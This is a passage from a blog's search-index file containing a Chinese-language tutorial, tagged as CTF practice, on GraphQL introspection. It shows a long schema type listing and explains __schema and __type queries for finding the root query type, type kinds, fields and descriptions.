&#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnpinIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnpinIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnpinnedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnresolveReviewThreadInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnresolveReviewThreadPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnsubscribedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Updatable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatableComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateBranchProtectionRuleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateBranchProtectionRulePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckRunInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckRunPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckSuitePreferencesInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckSuitePreferencesPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAdministratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAdministratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAllowPrivateRepositoryForkingSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAllowPrivateRepositoryForkingSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseDefaultRepositoryPermissionSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseDefaultRepositoryPermissionSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanChangeRepositoryVisibilitySettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanChangeRepositoryVisibilitySettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanCreateRepositoriesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanCreateRepositoriesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteIssuesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteIssuesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteRepositoriesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteRepositoriesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanInviteCollaboratorsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanInviteCollaboratorsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanMakePurchasesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanMakePurchasesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanUpdateProtectedBranchesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanUpdateProtectedBranchesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanViewDependencyInsightsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanViewDependencyInsightsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOrganizationProjectsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOrganizationProjectsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOwnerOrganizationRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOwnerOrganizationRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseProfileInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseProfilePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseRepositoryProjectsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseRepositoryProjectsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTeamDiscussionsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTeamDiscussionsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTwoFactorAuthenticationRequiredSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTwoFactorAuthenticationRequiredSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnvironmentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnvironmentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEnabledSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEnabledSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEntryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEntryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListForInstalledAppsEnabledSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListForInstalledAppsEnabledSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssueCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssueCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateNotificationRestrictionSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateNotificationRestrictionSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateOrganizationAllowPrivateRepositoryForkingSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateOrganizationAllowPrivateRepositoryForkingSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextItemFieldInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextItemFieldPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectNextPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestBranchInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestBranchPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatePullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRefInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRefPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSponsorshipPreferencesInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSponsorshipPreferencesPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSubscriptionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateSubscriptionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTeamDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTopicsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateTopicsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;User&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserBlockDuration&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserBlockedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserContentEdit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserContentEditConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserContentEditEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserEmailMetadata&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatus&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserStatusOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomain&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifiableDomainOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifyVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;VerifyVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ViewerHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Votable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Workflow&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;WorkflowRun&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;X509Certificate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Directive&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__DirectiveLocation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__EnumValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Field&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__InputValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Schema&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__Type&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;__TypeKind&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Query, Character, Human, Episode, Droid</strong> - 这些是我们在类型系统中定义的类型。</li>
<li><strong>String, Boolean</strong> - 这些是内建的标量，由类型系统提供。</li>
<li><strong>__Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive</strong> - 这些有着两个下划线的类型是内省系统的一部分。</li>
</ul>
<p>当我们设计类型系统的时候，我们确定了一个所有查询开始的地方</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __schema &#123; </span><br><span class="line">    queryType&#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到查询结果为Query，这就表示所有查询开始的地方为Query</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315180125269.png" class title="image-20220315180125269">



<h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>有时候也需要检验一个特定的类型是对象还是接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;User&quot;) &#123; </span><br><span class="line">      name</span><br><span class="line">      kind</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器返回OBJECT，这里表明User类型为对象</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315180624257.png" class title="image-20220315180624257">

<p>Actor类型为接口</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315181625124.png" class title="image-20220315181625124">



<h3 id="查询对象字段"><a href="#查询对象字段" class="headerlink" title="查询对象字段"></a>查询对象字段</h3><p>对于对象类型来说，我们需要知道其所包含的字段，方便后续进行查询，通过fields字段进行查询</p>
<p>查询语句:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;类型&quot;) &#123; </span><br><span class="line">    name</span><br><span class="line">    fields&#123;</span><br><span class="line">      name</span><br><span class="line">      type&#123;</span><br><span class="line">        name</span><br><span class="line">        kind</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>查询User类型包含字段，如图:</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315182105036.png" class title="image-20220315182105036">



<p>后续我们也可以通过ofType字段进一步查询定义的字段说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;类型&quot;) &#123; </span><br><span class="line">    name</span><br><span class="line">    fields&#123;</span><br><span class="line">      name</span><br><span class="line">      type&#123;</span><br><span class="line">        name</span><br><span class="line">        kind</span><br><span class="line">        ofType&#123;</span><br><span class="line">        name </span><br><span class="line">        kind</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315182934064.png" class title="image-20220315182934064">

<h3 id="请求文档"><a href="#请求文档" class="headerlink" title="请求文档"></a>请求文档</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __type(name:&quot;类型&quot;) &#123; </span><br><span class="line">    name</span><br><span class="line">    kind</span><br><span class="line">    description</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315183231073.png" class title="image-20220315183231073">
]]></content>
      <categories>
        <category>内功心法</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>-GraphQl -CTF练习</tag>
      </tags>
  </entry>
</search>
